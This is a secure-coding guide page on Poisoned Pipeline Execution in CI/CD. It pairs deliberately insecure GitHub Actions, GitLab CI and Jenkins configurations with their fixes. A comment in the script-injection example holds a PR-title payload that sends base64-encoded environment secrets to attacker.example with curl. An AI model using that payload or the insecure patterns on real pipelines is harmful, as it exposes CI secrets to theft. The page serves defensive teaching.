# CICD-SEC-4: Poisoned Pipeline Execution - Code Examples

Each pair below shows a **vulnerable** pipeline and the **secure** version in the same system. The examples focus on the patterns that dominate real PPE findings: privileged fork triggers, untrusted checkout, unpinned actions, expression injection, and executing repo-controlled scripts with secrets in scope.

## GitHub Actions

### 1. Fork PR Build — `pull_request_target` vs `pull_request` (3PE)

#### Insecure

```yaml
on:
  pull_request_target:              # runs in base context: secrets + write token
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # untrusted fork code
      - run: npm ci                 # attacker's lifecycle hooks run WITH secrets
      - run: npm test
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}   # readable by attacker code
```

#### Secure

```yaml
on:
  pull_request:                     # fork code runs with NO secrets, read-only token
jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v4   # PR head, but nothing sensitive is present
      - run: npm ci
      - run: npm test               # no secrets in scope; a hook gains nothing
```

> If fork PRs genuinely need a secret (rare), run untrusted code in a no-secret `pull_request` job and do the privileged step in a separate, trusted workflow that never checks out PR code.

### 2. Script Injection via Untrusted Event Data

#### Insecure

```yaml
- name: comment
  run: |
    echo "New PR: ${{ github.event.pull_request.title }}"
    ./notify.sh "${{ github.event.pull_request.title }}"
  # PR title = '"; curl attacker.example -d "$(env|base64)"; echo "'  -> injection
```

#### Secure

```yaml
- name: comment
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}   # arrives as data
  run: |
    echo "New PR: $PR_TITLE"
    ./notify.sh "$PR_TITLE"                            # quoted, not interpolated
```

### 3. Unpinned Third-Party Action

#### Insecure

```yaml
steps:
  - uses: some-org/setup-tool@main    # branch: repointable to malicious code
  - uses: some-org/deploy@v2          # tag: can be moved silently
```

#### Secure

```yaml
steps:
  - uses: some-org/setup-tool@3a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b   # v1.4.2 (SHA-pinned)
  - uses: some-org/deploy@9f8e7d6c5b4a39281706f5e4d3c2b1a09f8e7d6c        # v2.0.1 (SHA-pinned)
```

### 4. Over-Privileged Token vs Least Privilege

#### Insecure

```yaml
# No permissions block -> token may default to read/write on contents & packages.
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: make build            # if poisoned, token can push code / publish
```

#### Secure

```yaml
on: [push]
permissions:
  contents: read                   # repo-wide default: read-only
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: make build            # poisoned code has no write scope to abuse
```

## GitLab CI

### 5. Fork MR Pipeline — Exposing Protected Variables (D-PPE / 3PE)

#### Insecure

```yaml
# .gitlab-ci.yml — deploy job runs on any branch/MR, reading a protected token
deploy:
  script:
    - ./deploy.sh
  variables:
    DEPLOY_TOKEN: $PROD_DEPLOY_TOKEN     # available to fork-MR pipelines too
  rules:
    - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'   # includes fork MRs
```

#### Secure

```yaml
# Untrusted MR pipelines run tests only, with NO protected variables.
test:
  script:
    - npm ci && npm test
  rules:
    - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'

# Deploy runs only on the protected default branch, where PROD_DEPLOY_TOKEN
# is a *protected* + *masked* CI/CD variable, unavailable to fork pipelines.
deploy:
  script:
    - ./deploy.sh
  environment: production
  rules:
    - if: '$CI_COMMIT_BRANCH == "main" && $CI_PIPELINE_SOURCE == "push"'
```

> Mark deploy credentials as **protected** and **masked** variables, and require that fork-MR pipelines be run manually by a project member.

### 6. Indirect PPE via an Included Script (GitLab)

#### Insecure

```yaml
build:
  script:
    - make build        # Makefile is repo-controlled; an MR can rewrite it
  variables:
    REGISTRY_TOKEN: $REGISTRY_TOKEN    # readable by whatever make runs
```

#### Secure

```yaml
# 1) Untrusted MR builds carry no registry token:
build:
  script:
    - make build
  rules:
    - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'
  # no REGISTRY_TOKEN here

# 2) Publishing (which needs the token) runs only from protected main,
#    after review, so a poisoned Makefile in an MR never sees the secret.
publish:
  script:
    - make publish
  variables:
    REGISTRY_TOKEN: $REGISTRY_TOKEN
  rules:
    - if: '$CI_COMMIT_BRANCH == "main" && $CI_PIPELINE_SOURCE == "push"'
```

## Jenkins

### 7. Multibranch Pipeline Building Untrusted Branches (D-PPE)

#### Insecure

```groovy
// Jenkinsfile executed from every branch, binding a deploy credential globally
pipeline {
  agent any
  environment {
    DEPLOY_KEY = credentials('prod-deploy-key')   // bound for the whole run
  }
  stages {
    stage('build') { steps { sh 'make build' } }  // branch controls Makefile + Jenkinsfile
  }
}
```

#### Secure

```groovy
pipeline {
  agent { label 'ephemeral' }        // disposable agent, destroyed after the run
  stages {
    stage('build') {
      steps { sh 'make build' }        // no credentials bound during build
    }
    stage('deploy') {
      when { branch 'main' }           // only the trusted, merged branch deploys
      steps {
        // credential scoped to just this block, only on main
        withCredentials([string(credentialsId: 'prod-deploy-key', variable: 'DEPLOY_KEY')]) {
          sh './deploy.sh'
        }
      }
    }
  }
}
```

Also configure the GitHub/Git branch source so that branches and PRs from non-trusted authors do not build automatically (or require approval), and never grant PR builds access to deploy credentials.

### 8. Untrusted Event Data in a Jenkins Shell Step

#### Insecure

```groovy
// CHANGE_TITLE comes from the PR; inlined into the shell via Groovy interpolation
sh "echo Building PR: ${env.CHANGE_TITLE}"    // title with $(...) / ; runs commands
```

#### Secure

```groovy
// Pass through the environment and single-quote in the shell so it stays data
withEnv(["PR_TITLE=${env.CHANGE_TITLE}"]) {
  sh 'echo "Building PR: $PR_TITLE"'
}
```

## What Changed, and Why

| Pattern | Vulnerable | Secure |
|---------|------------|--------|
| Fork trigger | `pull_request_target` + checkout of PR head | `pull_request` (no secrets) / split trusted job |
| Event data | Inlined `${{ github.event.* }}` / `${env.CHANGE_*}` in shell | Passed via env var and quoted |
| Action / dependency pins | Mutable `@main` / `@vN` / moving tags | Full commit SHA / digest |
| Token & variables | Default write token; unscoped CI/CD variables | Explicit least-privilege; protected + masked, branch-scoped |
| Build vs deploy creds | Same credential bound for the whole run | Build has none; deploy creds only on trusted branch, scoped |
| Runners | Persistent / self-hosted on fork PRs | Ephemeral; forks never touch privileged runners |

## Next Steps

- **[Prevention](prevention.md)**: The full layered strategy for keeping untrusted code away from secrets
- **[Attack Vectors](attack-vectors.md)**: How these misconfigurations are exploited
- **[CI/CD Security Track](/learn/cicd)**: Continue the OWASP CI/CD Top 10 lessons
- **[Practice](/practice)**: Apply what you have learned in hands-on exercises
